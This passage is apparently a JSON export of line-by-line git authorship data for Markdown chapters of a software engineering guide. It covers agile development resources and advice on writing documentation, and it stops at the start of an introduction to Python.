        "content": "\u003e -- from [Can big organizations be agile?](https://www.forbes.com/sites/stevedenning/2016/11/26/can-big-organizations-be-agile/#316f8d6238e7) by Steve Denning"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "[Having been agile since its inception in 2008](https://medium.com/project-management-learnings/spotify-squad-framework-part-i-8f74bcfcd761), Spotify has made full use of the fact that agile development is flexible, iterative and people-oriented to push out their new ideas efficiently. In this case, Spotify could steer the firm\u0027s strategy in a novel direction after sudden inspiration (\"flexible\"), and implemented the new feature in steps by \"carry[ing] out a series of tests\" (\"iterative\") while working together in a small group known as the *Discover Weekly* team (\"people-oriented\")."
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "[And Spotify is not the only company to have benefitted from agile development](https://www.forbes.com/sites/stevedenning/2016/11/26/can-big-organizations-be-agile/#316f8d6238e7). Evidently, agile development has the potential to do much for your project and organization - but only after you learn how to unleash this potential proper."
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Other Related Resources"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "Here is a compilation of other resources on agile development for your further exploration:"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Getting Started With Agile Development"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "- [How to start with agile development](https://saucelabs.com/blog/how-to-start-with-agile-development)"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "- [The Agile Coach](https://www.atlassian.com/agile)"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "- [The Beginner\u0027s Guide to Scrum and Agile Project Management](https://blog.trello.com/beginners-guide-scrum-and-agile-project-management)"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Roles on Agile Teams: From Small to Large Teams](https://www.ambysoft.com/essays/agileRoles.html)"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Scaled Agile Framework (SAFe)](https://www.scaledagileframework.com/agile-teams/)"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Comparing Different Agile Frameworks"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "- [How to Pick the Right Agile Tool](https://www.smartsheet.com/how-pick-right-agile-tool)"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "- [Kanban vs Scrum](https://www.cprime.com/2015/02/3-differences-between-scrum-and-kanban-you-need-to-know/)"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Scrum vs Kanban vs Scrumban](https://www.eylean.com/blog/2013/05/scrum-vs-kanban-vs-scrumban-planning-estimation-and-performance-metrics/)"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "- [Scrum vs Kanban vs Lean vs XP](https://dzone.com/articles/agile-framework-comparison-scrum-vs-kanban-vs-lean)"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "- [XP vs FDD vs FDSM](https://project-management.com/xp-fdd-dsdm-and-crystal-methods-of-agile-development/)"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 11,
      "jamessspanggg": 8,
      "-": 129
    }
  },
  {
    "path": "contents/projectManagement/documentation.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Documentation"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Documentation"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Chua Ka Yi Ong](https://github.com/kychua)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "## Introduction"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "Software documentation refers to information that explains the code in a software project or how to use a software product or API. "
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "Many developers neglect writing documentation because they find it boring or troublesome, which is a pity because documentation communicates what you have done to the world - without documentation, people won\u0027t know about your awesome code or cool features."
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e The difference between a tolerable programmer and a great programmer is not how many programming languages they know, and it’s not whether they prefer Python or Java. It’s whether they can communicate their ideas. By persuading other people, they get leverage. By writing clear comments and technical specs, they let other programmers understand their code, which means other programmers can use and work with their code instead of rewriting it. Absent this, their code is worthless. By writing clear technical documentation for end users, they allow people to figure out what their code is supposed to do, which is the only way those users can see the value in their code. There’s a lot of wonderful, useful code buried on sourceforge somewhere that nobody uses because it was created by programmers who don’t write very well (or don’t write at all), and so nobody knows what they’ve done and their brilliant code languishes."
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e [Advice for Computer Science College Students](https://www.joelonsoftware.com/2005/01/02/advice-for-computer-science-college-students/), by Joel Spolsky"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "## Why Write Documentation"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "There are many benefits to writing good documentation, such as the following:"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "* **Makes things easier for yourself**: when you look back at your code a few months later, well-written documentation can make things a lot easier by explaining what you had been thinking when you were writing the code, when you find yourself confused by your own work"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "* **Improves your code**: documentation forces you to think carefully about what you are trying to do and why you have chosen to implement it in a particular way"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "* **Encourages others to contribute to your software**: by documenting how to contribute, it makes easier for others to do so, so they are more likely to help out"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "* **Encourages others to use your software**: [\"If it isn\u0027t documented, it doesn\u0027t exist.\"](http://www.mikepope.com/blog/DisplayBlog.aspx?permalink\u003d1680)"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "## Writing Good Documentation"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "Documentation should not be written for the sake of writing, but rather, to fulfill a need."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "Good documentation is up-to-date and includes only what is necessary."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "Documentation comes in many different forms."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "Below are some guidelines on how to tackle each type of documentation."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "### Written Documentation"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "Written documentation refers to what people usually think of as documentation - READMEs, user guides and developer guides."
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "In general, written documentation should use:"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "* grammatically correct language"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "* [simple language](https://wiki.zephyrproject.org/view/Documentation_style_guide#Simple_English): your documentation might be read by non-native speakers and use of idioms or flowery language can make it difficult for readers to understand"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "* markup: use formatting such as colors and italics and structural elements like admonition blocks to highlight important points"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "* realistic examples"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "Futhermore, you should always:"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [test your instructions](https://idratherbewriting.com/2015/07/07/testing-your-instructions/)"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "* find *someone else* to test your instructions"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "* [revise, revise and revise!](https://jacobian.org/writing/editors/)"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "[This](https://www.bluemangolearning.com/software-documentation/) provides useful general tips for writing documentation and "
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "[this guide](https://jacobian.org/writing/technical-style/) provides more tips on writing well. "
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "#### README"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "A README serves as an introduction to your project, and is often the first thing people see when encountering your project.\u003cbr\u003e"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "A good README should convince users to use your product or contribute to your code, by providing enough information to make it easy for them to get started."
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "For a good guide on how to write a README, check out [this guide](https://www.writethedocs.org/guide/writing/beginners-guide-to-docs/)."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "* Some suggest that READMEs should be written before you start coding, as it gives you an overview of your project and what you need to do."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "This is known as [Readme Driven Development](https://tom.preston-werner.com/2010/08/23/readme-driven-development.html)."
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "#### User Guide"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "A user guide teaches users how to use your software."
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "User guides can include quickstart guides, reference materials, tutorials, cookbooks/recipes and more."
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "[Here](https://jacobian.org/writing/what-to-write/) is a useful guide on how to tackle different types of user documentation."
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "[This](https://stevelosh.com/blog/2013/09/teach-dont-tell/) points out the problems with common approaches to documentation and builds on the previous article."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "#### Developer Guide"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "Developer guides teach new developers how to contribute to the code base."
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "They should give an overview of the code and an explanation of the design, as well as include instructions for setting up, making changes and deploying."
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "See [this](https://www.petrikainulainen.net/software-development/processes/writing-just-enough-documentation/) to learn more about what to include in a developer guide."
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "### Code Documentation"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "Code docummentation refers to documentation that is found within the source code."
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "All the following types of code documentation are important and complement one another."
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "Note that such documentation should always be updated together with the code."
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "#### Comments"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "Comments are a well-known form of documentation."
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "They [complement the code](https://softwareengineering.stackexchange.com/a/285789) and are intended for developers who use and work on the code."
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "They include API documentation for variables, methods, classes, and packages, as well as inline comments."
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "API documentation for variables, methods, classes, and packages explain what they do."
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "Good API documentation should enable users to use the API without having to guess how to use it or be confronted with unexpected behavior."
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "Thus, comments for methods should include the input and output, assumptions, edge cases and possible exceptions or errors thrown by the method."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "Comments can also refer to inline comments."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "Even the most well-written code can leave ambiguous questions. "
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "For example, code cannot explain why a line of code was written in a specific way, as discussed in [this article](https://blog.codinghorror.com/code-tells-you-how-comments-tell-you-why/). "
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "In such cases, well-written comments can clarify and make the code easier to understand. "
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "Note however, that excessive comments are also a code smell. "
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "Comments should not repeat what the code is saying and requiring a lot of comments to explain what you are doing can suggest that the code is too convoluted."
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "Often, comments can be replaced by clearer code."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "As much as possible, code should be written as clearly as possible, with comments added in only when necessary."
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "[This Stack Overflow answer](https://stackoverflow.com/a/209089) gives a good example on how to do this."
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "For a more detailed explanation, read [this article](https://blog.codinghorror.com/coding-without-comments/)."
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "#### Source Code"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "The source code is a form of documentation."
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "Well-written code makes it easy for developers to understand what the code is doing."
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "This can be done via a number of ways, such as"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "* using meaningful names for variables, functions and classes"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "* using useful error messages"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "* being consistent"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "* following software engineering principles"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "#### Tests"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "Tests are another form of documentation as they make the expected behavior of the methods clear for different types of input and edge cases."
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "### Version Control"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "Version control is also a form of documentation."
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "Having access to how the code base was changed over time can shows how, when and why a piece of code was written or changed. "
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "For this to work well, it is important to write good commit messages and follow good commit practices."
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "[This](https://robots.thoughtbot.com/5-useful-tips-for-a-better-commit-message) explains what to include in commit messages while"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "[this article](https://mislav.net/2014/02/hidden-documentation/) explains how to use Git to make full use of your code\u0027s version control history."
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "For more resources on commit messages, check out [this Stack Overflow thread](https://stackoverflow.com/questions/15324900/standard-to-follow-when-writing-git-commit-messages)."
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "* For inspiration: https://github.com/PharkMillups/beautiful-docs"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* An overview of the different types of documentation and good examples of each type: https://www.ybrikman.com/writing/2014/05/05/you-are-what-you-document/"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* Documentation principles: https://www.writethedocs.org/guide/writing/docs-principles/"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* Agile documentation: https://www.agilemodeling.com/essays/agileDocumentationBestPractices.htm"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "* Video on how to write great documentation: https://www.youtube.com/watch?v\u003dz3fRu9pkuXE"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "## Acknowledgements"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "In addition to the links mentioned above, here are the links used in the writing of this article:"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "* https://opensource.com/business/15/5/write-better-docs"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* https://www.developer.com/tech/article.php/10923_3848981_2/The-7-Rules-for-Writing-World-Class-Technical-Documentation.htm"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "* https://spin.atomicobject.com/2015/04/17/code-as-documentation/"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* https://mikegrouchy.com/blog/2013/03/yes-your-code-does-need-comments.html"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "* https://chromium.googlesource.com/chromium/src/+/master/docs/documentation_best_practices.md#Documentation-is-the-story-of-your-code"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "* https://blog.jooq.org/2013/02/26/the-golden-rules-of-code-documentation/"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "* https://bryce.fisher-fleig.org/blog/effective-commit-messages/"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* https://tom.preston-werner.com/2010/08/23/readme-driven-development.html"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "* http://www.cs.ecu.edu/karl/3300/spr14/Notes/Documentation/documentation.html"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* https://www.tylerbutler.com/2013/06/the-importance-of-documentation/"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "* https://softwareengineering.stackexchange.com/questions/154615/are-unit-tests-really-used-as-documentation"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* https://blog.smartbear.com/careers/13-things-people-hate-about-your-open-source-docs/"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "* https://byrslf.co/writing-great-documentation-44d90367115a#.qdxj6dcx4"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "* https://news.ycombinator.com/item?id\u003d8414714"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* https://www.developer.com/tech/article.php/10923_3848981_2/The-7-Rules-for-Writing-World-Class-Technical-Documentation.htm"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "* http://www.onlamp.com/pub/a/onlamp/2006/09/07/unit-testing-docs.html"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "* https://blog.jooq.org/2013/02/26/the-golden-rules-of-code-documentation/"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "* https://vip.wordpress.com/documentation/commit-messages/#a-good-commit-message-should-not-depend-on-the-code-to-explain-what-it-does-or-why-it-does-it"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "* https://news.ycombinator.com/item?id\u003d10212582"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "* https://arialdomartini.wordpress.com/2012/09/03/pre-emptive-commit-comments/"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "* https://spin.atomicobject.com/2015/04/24/source-control-documentation/"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "* https://wiki.openstack.org/wiki/GitCommitMessages"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "* https://github.com/matiassingers/awesome-readme"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "jamessspanggg": 17,
      "-": 160
    }
  },
  {
    "path": "contents/python/introduction-to-python.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: An Introduction to Python"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# An Introduction to Python"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Samson Tan Min Rong](https://www.linkedin.com/in/samsontmr/), [Phang Chun Rong](https://www.github.com/Crphang)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
